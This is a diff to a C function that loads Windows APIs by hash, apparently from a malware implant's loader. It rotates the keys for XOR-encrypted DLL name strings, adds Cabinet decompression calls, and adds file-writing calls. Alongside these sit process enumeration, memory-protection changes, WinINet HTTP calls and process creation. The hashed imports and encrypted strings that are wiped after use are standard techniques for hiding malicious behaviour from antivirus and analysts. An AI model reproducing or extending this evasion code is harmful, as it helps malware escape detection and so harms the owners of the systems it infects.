@@ -12,11 +12,13 @@ BOOL loadApi(API_Call *APICall) {
 	Shell32_API* Shell32Api = &(APICall->Shell32Api);
 	Ws2_32_API* Ws2_32Api = &(APICall->Ws2_32Api);
 	Wininet_API* WininetApi = &(APICall->WininetApi);
+	Cabinet_API* CabinetApi = &(APICall->CabinetApi);
 
-	char Advapi32DllStr[] = "\x18\x2A\x23\x11\x26\x02\x64\x64\x7A\x35\x0E\x2F\x55";
-	char Shell32DllStr[] = "\x3F\x04\x09\x00\x00\x5F\x5E\x42\x08\x00\x00\x6C";
-	char Ws2_32DllStr[] = "\x3B\x35\x7C\x13\x6B\x74\x5D\x10\x34\x1B\x76";
-	char WininetDllStr[] = "\x12\x00\x03\x07\x0B\x20\x1D\x43\x0A\x09\x29\x69";
+	char Advapi32DllStr[] = "\x26\x2B\x32\x24\x07\x13\x54\x7D\x6A\x21\x1B\x16\x67";
+	char Shell32DllStr[] = "\x30\x18\x29\x07\x03\x59\x79\x66\x13\x3D\x28\x55";
+	char Ws2_32DllStr[] = "\x39\x1F\x65\x3C\x59\x68\x77\x0B\x39\x23\x78";
+	char WininetDllStr[] = "\x23\x00\x1B\x2D\x0A\x28\x15\x46\x2B\x23\x24\x7A";
+	char CabinetDllStr[] = "\x1B\x14\x26\x33\x3B\x00\x30\x44\x12\x3E\x01\x69";
 
 
 	const DWORD hash_kernel32_dll = 0x29cdd463;
@@ -32,10 +34,11 @@ BOOL loadApi(API_Call *APICall) {
 	if(pLoadLibraryA == NULL)
 		return FALSE;
 
-	decryptionRoutine(Advapi32DllStr,13,"\x59\x4E\x55\x70\x56\x6B\x57\x56\x54\x51\x62\x43\x55");
-	decryptionRoutine(Shell32DllStr,12,"\x6C\x00\x57\x5A\x49\x62\x65\x54\x4C\x62\x62\x6D");
-	decryptionRoutine(Ws2_32DllStr,11,"\x6C\x46\x4E\x4C\x58\x46\x73\x74\x58\x77\x76");
-	decryptionRoutine(WininetDllStr,12,"\x45\x69\x6D\x6E\x65\x00\x53\x00\x6E\x4A\x49\x75");
+	decryptionRoutine(Advapi32DllStr,13,"\x67\x4F\x44\x45\x77\x7A\x00\x42\x7A\x45\x69\x53\x6B");
+	decryptionRoutine(Shell32DllStr,12,"\x63\x70\x4C\x6B\x6F\x6A\x4B\x48\x77\x51\x44\x55");
+	decryptionRoutine(Ws2_32DllStr,11,"\x6E\x6C\x57\x63\x6A\x5A\x59\x6F\x55\x4F\x78");
+	decryptionRoutine(WininetDllStr,12,"\x74\x69\x75\x44\x64\x4D\x61\x68\x4F\x4F\x48\x7A");
+	decryptionRoutine(CabinetDllStr,12,"\x58\x75\x44\x5A\x55\x65\x44\x6A\x76\x52\x6D\x69");
 
 
 	Kernel32Api->CreateToolhelp32SnapshotF = (CreateToolhelp32Snapshot_F)find_api(pPeb,hash_kernel32_dll, 0x9eb60b55);
@@ -62,7 +65,11 @@ BOOL loadApi(API_Call *APICall) {
 	Kernel32Api->GetWindowsDirectoryAF = (GetWindowsDirectoryA_F)find_api(pPeb,hash_kernel32_dll, 0x74566ab2);
 	Kernel32Api->LocalAllocF = (LocalAlloc_F)find_api(pPeb,hash_kernel32_dll, 0x4df81bbd);
 	Kernel32Api->LocalFreeF = (LocalFree_F)find_api(pPeb,hash_kernel32_dll, 0xbbf7c456);
-	if(Kernel32Api->CreateToolhelp32SnapshotF == NULL ||Kernel32Api->Process32FirstF == NULL ||Kernel32Api->Process32NextF == NULL ||Kernel32Api->Process32FirstWF == NULL ||Kernel32Api->Process32NextWF == NULL ||Kernel32Api->CloseHandleF == NULL ||Kernel32Api->GetModuleFileNameWF == NULL ||Kernel32Api->GetCurrentProcessF == NULL ||Kernel32Api->OpenProcessF == NULL ||Kernel32Api->Wow64DisableWow64FsRedirectionF == NULL ||Kernel32Api->Wow64RevertWow64FsRedirectionF == NULL ||Kernel32Api->CreateFileAF == NULL ||Kernel32Api->DeleteFileAF == NULL ||Kernel32Api->VirtualProtectF == NULL ||Kernel32Api->VirtualFreeF == NULL ||Kernel32Api->VirtualAllocF == NULL ||Kernel32Api->CreateDirectoryAF == NULL ||Kernel32Api->CopyFileAF == NULL ||Kernel32Api->GetModuleFileNameAF == NULL ||Kernel32Api->GetProcessIdF == NULL ||Kernel32Api->CreateProcessWF == NULL ||Kernel32Api->GetWindowsDirectoryAF == NULL ||Kernel32Api->LocalAllocF == NULL ||Kernel32Api->LocalFreeF == NULL)
+	Kernel32Api->CreateDirectoryWF = (CreateDirectoryW_F)find_api(pPeb,hash_kernel32_dll, 0xd6a41995);
+	Kernel32Api->SetFileInformationByHandleF = (SetFileInformationByHandle_F)find_api(pPeb,hash_kernel32_dll, 0x190559a2);
+	Kernel32Api->CreateFileWF = (CreateFileW_F)find_api(pPeb,hash_kernel32_dll, 0xda4b2484);
+	Kernel32Api->WriteFileF = (WriteFile_F)find_api(pPeb,hash_kernel32_dll, 0xd6bc7fea);
+	if(Kernel32Api->CreateToolhelp32SnapshotF == NULL ||Kernel32Api->Process32FirstF == NULL ||Kernel32Api->Process32NextF == NULL ||Kernel32Api->Process32FirstWF == NULL ||Kernel32Api->Process32NextWF == NULL ||Kernel32Api->CloseHandleF == NULL ||Kernel32Api->GetModuleFileNameWF == NULL ||Kernel32Api->GetCurrentProcessF == NULL ||Kernel32Api->OpenProcessF == NULL ||Kernel32Api->Wow64DisableWow64FsRedirectionF == NULL ||Kernel32Api->Wow64RevertWow64FsRedirectionF == NULL ||Kernel32Api->CreateFileAF == NULL ||Kernel32Api->DeleteFileAF == NULL ||Kernel32Api->VirtualProtectF == NULL ||Kernel32Api->VirtualFreeF == NULL ||Kernel32Api->VirtualAllocF == NULL ||Kernel32Api->CreateDirectoryAF == NULL ||Kernel32Api->CopyFileAF == NULL ||Kernel32Api->GetModuleFileNameAF == NULL ||Kernel32Api->GetProcessIdF == NULL ||Kernel32Api->CreateProcessWF == NULL ||Kernel32Api->GetWindowsDirectoryAF == NULL ||Kernel32Api->LocalAllocF == NULL ||Kernel32Api->LocalFreeF == NULL ||Kernel32Api->CreateDirectoryWF == NULL ||Kernel32Api->SetFileInformationByHandleF == NULL ||Kernel32Api->CreateFileWF == NULL ||Kernel32Api->WriteFileF == NULL)
 		return FALSE;
 
 	if(pLoadLibraryA(Advapi32DllStr) != NULL) {
@@ -141,6 +148,17 @@ BOOL loadApi(API_Call *APICall) {
 		WininetApi->InternetConnectWF = (InternetConnectW_F)find_api(pPeb,WininetHash, 0x27404e3f);
 		WininetApi->HttpSendRequestAF = (HttpSendRequestA_F)find_api(pPeb,WininetHash, 0xc2d42b63);
 		if(WininetApi->HttpOpenRequestAF == NULL ||WininetApi->InternetSetOptionAF == NULL ||WininetApi->InternetReadFileF == NULL ||WininetApi->InternetOpenAF == NULL ||WininetApi->InternetCloseHandleF == NULL ||WininetApi->InternetConnectWF == NULL ||WininetApi->HttpSendRequestAF == NULL)
+			return FALSE;
+	}else
+		return FALSE;
+
+	if(pLoadLibraryA(CabinetDllStr) != NULL) {
+		const DWORD CabinetHash = 0x48518359;
+		memset(CabinetDllStr,0x00,12);
+		CabinetApi->CreateDecompressorF = (CreateDecompressor_F)find_api(pPeb,CabinetHash, 0xf0b38127);
+		CabinetApi->DecompressF = (Decompress_F)find_api(pPeb,CabinetHash, 0x80ec17e2);
+		CabinetApi->CloseDecompressorF = (CloseDecompressor_F)find_api(pPeb,CabinetHash, 0xe418861);
+		if(CabinetApi->CreateDecompressorF == NULL ||CabinetApi->DecompressF == NULL ||CabinetApi->CloseDecompressorF == NULL)
 			return FALSE;
 	}else
 		return FALSE;
